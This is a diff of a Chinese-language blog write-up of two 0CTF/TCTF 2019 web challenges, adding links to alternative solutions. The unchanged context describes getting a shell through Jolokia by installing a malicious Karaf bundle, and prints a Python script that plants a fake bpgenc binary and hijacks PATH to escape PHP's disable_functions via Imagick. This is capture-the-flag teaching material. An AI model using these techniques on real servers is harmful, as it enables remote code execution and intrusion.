@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032609.png?raw=true">
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true">
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032611.png?raw=true">
-<meta property="og:updated_time" content="2019-03-27T10:33:36.406Z">
+<meta property="og:updated_time" content="2019-03-28T03:19:38.029Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0CTF&#x2F;TCTF2019 Web题解">
 <meta name="twitter:description" content="前言这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。">
@@ -125,9 +125,12 @@
 <p>这里就有点脑洞了，题目Ghost pepper=鬼椒=Jolokia，而Jolokia是一个JMX连接器，它能让外部通过向其暴露在外的HTTP接口POST JSON的方式来进行访问和修改 JMX 属性、执行 JMX 操作、搜索 MBean、列出 MBean 的 Meta-data 等操作。利用方式参考：<a href="https://www.anquanke.com/post/id/103016、https://www.anquanke.com/post/id/173262。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/103016、https://www.anquanke.com/post/id/173262。</a></p>
 <p>结合之前验证的时候提示的Karaf，Karaf则是一个OSGI容器，它可以被用来对bundle进行管理，我们可以通过它来进行bundle的安装和运行，也可以安装插件来实现更多的功能。此时我们可以猜测服务端的搭建流程是先安装了Karaf，然后在Karaf中安装了Jolokia来进行远程管理，所以我们就可以通过Jolokia来对它进行远程访问，通过让它安装恶意bundle然后运行的方式，执行我们的恶意代码。</p>
 <p>还有另外一个更加简单的解法，来自郁离歌师傅：<a href="http://yulige.top/?p=673" target="_blank" rel="noopener">http://yulige.top/?p=673</a></p>
+<p>更多的解法：<a href="https://xz.aliyun.com/t/4590#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4590#toc-1</a></p>
+<p>看来Karaf中的功能还是很多的，可以利用的点也很多。</p>
 <p>接下来我们需要知道访问接口时所需要的参数，我们下载源码进行审计，在apache-karaf-4.2.4\bundle\core\src\main\java\org\apache\karaf\bundle\core\internal\BundlesMBeanImpl.java中可以看到：</p>
 <p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032604.png?raw=true" alt=""></p>
 <p>在start bundle的时候会调用它的start函数，所以我们可以编写一个恶意的bundle，在里面实现一个恶意的start方法，然后向服务端POST JSON数据，让服务端安装我们的恶意bundle并执行里面的start方法，就可以getshell了。</p>
+<p>或者也可以像这一篇文章一样，直接调用两个参数的install方法，一步到位：<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#ghost-pepper</a></p>
 <h4 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h4><ul>
 <li><p>karaf/karaf通过验证</p>
 </li>
@@ -176,6 +179,11 @@
 <p>运行php Twings.php，可以看到：</p>
 <p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true" alt=""></p>
 <p>成功了！</p>
+<p>更多的解法，利用LD_PRELOAD环境变量+调用execve的PHP函数：</p>
+<p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p>绕过open_basedir读文件：</p>
+<p><a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy</a></p>
 <h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>直接贴脚本，我使用的是第二个delegate（delegate decode=”png” encode=”bpg” command=”&quot;@BPGEncodeDelegate@&quot; -b 12 -sstdout=%%stderr &quot;%Q&quot; -o &quot;%o&quot; &quot;%i&quot;”），即调用了bpgenc的delegate：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://111.186.63.208:31340/&quot;</span><br><span class="line">evil = open(&quot;bpgenc&quot;, &quot;rb&quot;).read()</span><br><span class="line">evil = base64.b64encode(evil)</span><br><span class="line">php = &quot;putenv(&apos;PATH=/tmp/40f955f039eabe222958ff57ac1bfdbb&apos;);&quot; \</span><br><span class="line">      &quot;file_put_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, base64_decode(&apos;&quot; + evil + &quot;&apos;));&quot; \</span><br><span class="line">      &quot;chmod(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, 0777);&quot; \</span><br><span class="line">      &quot;$image = new Imagick(&apos;http://*.*.*.*/sun.png&apos;);&quot; \</span><br><span class="line">      &quot;$image -&gt; writeImage(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/a.bpg&apos;);&quot; \</span><br><span class="line">      &quot;echo file_get_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/Pwn&apos;);&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;backdoor&quot;: php</span><br><span class="line">&#125;</span><br><span class="line">print requests.post(url, data=data).content</span><br></pre></td></tr></table></figure>
 <p>结果：</p>
@@ -197,7 +205,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="cjtr2ngtk0000j0v6xcksc4tj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="cjts35b3h0000vkv6p2sqozq2" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
